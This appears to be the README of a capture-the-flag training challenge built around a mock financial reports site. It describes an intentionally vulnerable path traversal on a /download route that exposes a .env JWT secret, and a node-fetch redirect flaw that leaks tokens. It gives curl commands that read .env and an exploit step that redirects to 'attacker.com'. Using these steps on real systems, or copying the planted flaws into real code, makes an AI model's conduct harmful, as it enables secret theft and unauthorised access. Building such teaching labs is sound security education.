# FinCorp Financial Reports CTF Challenge

Note: This CTF intentionally exposes a vulnerable download route at the web app's `/download` endpoint to demonstrate path traversal and env-secret exposure.

This is a Capture The Flag (CTF) challenge involving a financial company's website with two distinct vulnerabilities.

## Challenge Overview

The challenge consists of two stages:

### Stage 1: Path Traversal Vulnerability
- **Target**: Extract JWT secret from `.env` file
- **Method**: File path traversal in the download endpoint
- **Goal**: Gain admin access by forging JWT tokens

### Stage 2: Node-fetch Redirect Header Leak (CVE-2022-0235)
- **Target**: Steal service token via redirect vulnerability
- **Method**: Exploit vulnerable node-fetch version that forwards Authorization headers on redirects
- **Goal**: Access the internal API flag endpoint

## Architecture

- **Web Container** (Port 8080): Public-facing website with admin dashboard
- **API Container** (Port 3001): Internal API service with flag endpoint
- **Network**: Both containers communicate via Docker network

## Setup Instructions

1. **Clone and navigate to the challenge directory:**
   ```bash
   cd /Users/alexsch/Reports_CTF
   ```

2. **Build and start the containers:**
   ```bash
   docker-compose up --build
   ```

3. **Access the application:**
   - Website: http://localhost:8080
   - Admin Dashboard: http://localhost:8080/admin (requires admin JWT)
   - API Health: http://localhost:3001/api/health

## Challenge Files

- `public/` - Static HTML files for the website
- `web/` - Web application (Node.js/Express)
- `api/` - Internal API service
- `env/` - Environment files with secrets
- `docker-compose.yml` - Container orchestration

## Vulnerabilities

### 1. Path Traversal (`/download` endpoint)
- Status: Intentionally vulnerable. The `/download` route in `web/app.js` performs unsafe path joining, allowing traversal to `.env`.

### 2. Node-fetch Redirect Header Leak
- **File**: `web/app.js` line ~95
- **Issue**: node-fetch 2.6.6 forwards Authorization headers on redirects
- **Exploit**: Use admin API client to call `/api/redirect?to=http://attacker.com`

## Flags

- **FLAG1**: Confirmation of admin access (in admin dashboard)
- **FLAG2**: Retrieved from `/api/flag` endpoint with stolen service token

## Testing the Challenge

1. **Test path traversal:**
   ```bash
   curl "http://localhost:8080/download?path=.env"
   ```

2. **Test admin login:**
   ```bash
   curl -X POST http://localhost:8080/admin/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"admin123"}'
   ```

3. **Test API redirect:**
   ```bash
   curl "http://localhost:3001/api/redirect?to=https://httpbin.org/get"
   ```

4. **Test file download via vulnerable route:**
   ```bash
   curl -I "http://localhost:8080/download?path=reports/q1-2025.pdf"
   ```

## Security Notes

This challenge is designed for educational purposes and demonstrates real-world vulnerabilities:
- CVE-2022-0235: node-fetch redirect header leak
- Path traversal vulnerabilities in file download endpoints
- JWT secret exposure in environment files

## Cleanup

To stop and remove containers:
```bash
docker-compose down
docker-compose down --volumes  # Remove volumes if needed
```
